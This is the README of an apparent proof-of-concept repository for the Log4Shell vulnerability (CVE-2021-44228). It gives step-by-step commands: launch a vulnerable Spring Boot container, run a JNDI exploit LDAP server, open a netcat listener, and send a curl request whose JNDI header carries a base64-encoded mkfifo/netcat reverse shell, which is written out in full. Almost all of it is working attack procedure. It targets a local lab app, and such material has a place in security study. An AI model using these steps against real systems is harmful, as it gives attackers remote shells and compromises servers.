# LOg4j

A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability.

Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.

In this repository we have made and example vulnerable application and proof-of-concept (POC) exploit of it.

## Proof-of-concept (POC)

#### Step 1 : Run Docker File which Include SpringBoot Vulnerable Application

```bash
cd log4shell-vulnerable-app
sudo docker run --rm -it -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
cd ..
```

#### Step 2 : Run the LDAP Server and Http Server

```bash
cd Log4shell_JNDIExploit
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <Your Attacking Machine IP>
```

#### Step 3 : Run the netcat Listner where you get reverse shell

```bash
nc -lvp <Port you want for Listner>
```

#### Step 4 Curl the Application with Malicious Code

```bash
[+] Step 1 : goto https://ssl-proxy.my-addr.org/myaddrproxy.php/https/www.revshells.com/
[+] Step 2 : Enter your Attacking Machine IP and Netcat Port which you have used before
[+] Step 3 : Select nc mkfifo in shell Type
[+] Step 4 : Copy the command which look like "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.119.21.67 1188 >/tmp/f"
[+] Step 5 : goto https://gchq.github.io/CyberChef/
[+] Step 6 : Select To Base64 and Enter "A-Za-z0-9-_" in Alphabet
[+] Step 7 : Paste the command you had copied from Reverse Shell Generator and Paste it in Input Box
[+] Step 8 : Copy the String from the Output box that is the Base64 encoding of the Malicious Command which will lead you to Remote shell
[+] Step 9 : Form a Curl request in this manner â‡©
    curl -H 'X-Api-Version: ${jndi:ldap://<Attacking Machine IP>:1389/Basic/Command/Base64/<Base64 Command you just copied Step 8>}' http://localhost:8080
```
